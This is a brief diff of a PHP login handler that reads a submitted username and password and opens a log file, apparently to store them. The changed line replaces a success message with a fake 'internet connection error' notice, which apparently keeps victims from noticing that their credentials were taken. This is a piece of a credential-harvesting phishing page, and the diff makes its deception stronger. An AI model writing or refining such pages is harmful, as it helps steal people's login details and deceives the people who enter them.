@@ -14,7 +14,7 @@
     $username = $_POST['uname'];
     $password = $_POST['password'];
 
-    echo "<h1> Loggin successful </h1>";
+    echo "<h1> internetconnection error please check your internet connection </h1>";
 
     $log = fopen("../logs/login.txt","w");
 
